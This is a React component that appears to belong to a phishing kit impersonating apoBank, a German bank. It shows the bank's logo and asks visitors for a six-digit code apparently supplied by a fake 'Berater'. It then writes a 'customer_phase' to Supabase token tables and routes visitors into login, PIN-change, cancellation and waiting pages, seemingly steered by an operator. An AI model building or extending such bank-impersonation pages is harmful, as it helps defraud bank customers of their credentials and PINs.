import { useEffect, useRef, useState } from "react";
import apoBankLogo from "@/assets/apobank-logo.svg";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";

type Kind = "limit" | "pin" | "auth" | "storno";

interface Props {
  kind?: Kind; // if omitted: try all tables
  title?: string;
  description?: string;
}

const tableFor = (k: Kind) =>
  k === "limit" ? "limit_tokens"
  : k === "auth" ? "auth_tokens"
  : k === "storno" ? "storno_tokens"
  : "pin_tokens";

const ORDER: Kind[] = ["limit", "pin", "auth", "storno"];

const TokenEntry = ({ kind, title, description }: Props) => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const [token, setToken] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const autoRan = useRef(false);

  const runSubmit = async (rawToken: string) => {
    setError(null);
    const compact = rawToken.replace(/[^0-9]/g, "").slice(0, 6);
    if (compact.length < 6) { setError("Bitte den vollständigen 6-stelligen Token eingeben."); return; }
    const clean = `${compact.slice(0, 3)}-${compact.slice(3)}`;
    setLoading(true);

    const kinds: Kind[] = kind ? [kind] : ORDER;
    let foundKind: Kind | null = null;
    let foundRow: any = null;
    for (const k of kinds) {
      const { data } = await (supabase as any)
        .from(tableFor(k))
        .select("id, token, used")
        .eq("token", clean)
        .maybeSingle();
      if (data) { foundKind = k; foundRow = data; break; }
    }

    if (!foundKind || !foundRow) {
      setLoading(false);
      setError("Token ungültig.");
      return;
    }
    if (foundRow.used) {
      setLoading(false);
      setError("Dieser Token wurde bereits verwendet.");
      return;
    }

    if (foundKind === "auth") {
      const { data: authRow, error: authLoadError } = await (supabase as any)
        .from("auth_tokens")
        .select("id, show_berater")
        .eq("id", foundRow.id)
        .maybeSingle();

      if (authLoadError || !authRow) {
        setLoading(false);
        setError("Der Vorgang konnte nicht gestartet werden. Bitte erneut versuchen.");
        return;
      }

      const nextPhase = authRow.show_berater ? "berater" : "login";
      const { error: updateError } = await (supabase as any)
        .from("auth_tokens")
        .update({
          customer_phase: nextPhase,
          used: true,
          used_at: new Date().toISOString(),
        })
        .eq("id", authRow.id)
        .eq("used", false);

      setLoading(false);
      if (updateError) {
        setError("Der Vorgang konnte nicht gestartet werden. Bitte erneut versuchen.");
        return;
      }
      navigate(`/auth/${encodeURIComponent(clean)}`);
      return;
    }

    if (foundKind === "storno") {
      // Check if berater step required
      const { data: fullRow } = await (supabase as any)
        .from("storno_tokens")
        .select("show_berater")
        .eq("token", clean)
        .maybeSingle();
      const nextPhase = fullRow?.show_berater ? "berater" : "widerruf";
      await (supabase as any)
        .from("storno_tokens")
        .update({ customer_phase: nextPhase })
        .eq("token", clean);
      setLoading(false);
      if (nextPhase === "berater") {
        navigate(`/widerruf/${encodeURIComponent(clean)}`);
      } else {
        navigate(`/widerruf?token=${encodeURIComponent(clean)}`);
      }
      return;
    }

    if (foundKind === "pin") {
      const { error: updateError } = await (supabase as any)
        .from("pin_tokens")
        .update({ customer_phase: "pin_aenderung" })
        .eq("token", clean);

      setLoading(false);
      if (updateError) {
        setError("Der Vorgang konnte nicht gestartet werden. Bitte erneut versuchen.");
        return;
      }
      navigate(`/pin-aenderung?token=${encodeURIComponent(clean)}`);
      return;
    }

    const { error: updateError } = await (supabase as any)
      .from(tableFor(foundKind))
      .update({ customer_phase: "token" })
      .eq("token", clean);

    setLoading(false);
    if (updateError) {
      setError("Der Vorgang konnte nicht gestartet werden. Bitte erneut versuchen.");
      return;
    }
    navigate(`/token/wait?kind=${foundKind}&token=${encodeURIComponent(clean)}`);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await runSubmit(token);
  };

  useEffect(() => {
    const t = searchParams.get("t") || searchParams.get("token");
    if (t && !autoRan.current) {
      autoRan.current = true;
      const compact = t.replace(/[^0-9]/g, "").slice(0, 6);
      const formatted = compact.length > 3 ? `${compact.slice(0, 3)}-${compact.slice(3)}` : compact;
      setToken(formatted);
      // Prefill only — customer must click "Weiter" to confirm.
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [searchParams]);




  return (
    <div className="min-h-screen bg-white flex flex-col relative">
      <img src={apoBankLogo} alt="apoBank Logo" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />
      <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
        <div className="w-full max-w-lg bg-white rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[190px]">
          <div className="bg-white border-b border-gray-200 px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
            <h1 className="text-2xl sm:text-4xl font-medium text-primary leading-tight" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>
              {title || "apoBank Vorgangsnummer"}
            </h1>
          </div>
          <div className="px-4 sm:px-8 py-5 sm:py-6 bg-muted border border-border/40 border-t-0">
            <p className="text-base text-foreground mb-6" style={{ fontFamily: "'Tanseek Modern Arabic Medium', Arial, sans-serif" }}>
              {description || "Bitte geben Sie die 6-stellige Vorgangsnummer ein, die Sie von Ihrem Berater erhalten haben."}
            </p>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="text-sm font-medium text-foreground/80 mb-1 block">Vorgangsnummer</label>
                <Input
                  value={token}
                  onChange={(e) => {
                    const raw = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
                    const formatted = raw.length > 3 ? `${raw.slice(0, 3)}-${raw.slice(3)}` : raw;
                    setToken(formatted);
                  }}
                  placeholder="XXX-XXX"
                  maxLength={7}
                  inputMode="numeric"
                  className="font-mono tracking-widest text-center text-lg border-primary/30 bg-white focus:ring-[3px] focus:ring-[#a0b0c8] focus:ring-offset-0 focus-visible:ring-[3px] focus-visible:ring-[#a0b0c8] focus-visible:ring-offset-0"
                  autoFocus
                />
                {error && <p className="text-xs text-destructive mt-2">{error}</p>}
              </div>
              <div className="flex justify-end">
                <Button
                  type="submit"
                  variant="outline"
                  className={cn(
                    "px-8 bg-white hover:bg-white",
                    token.length > 0
                      ? "border-foreground text-foreground hover:text-foreground"
                      : "border-muted-foreground/40 text-muted-foreground hover:text-muted-foreground"
                  )}
                >
                  Weiter
                </Button>
              </div>
            </form>
          </div>
        </div>
      </div>
      <ContactSection />
      <Footer />
    </div>
  );
};

export default TokenEntry;
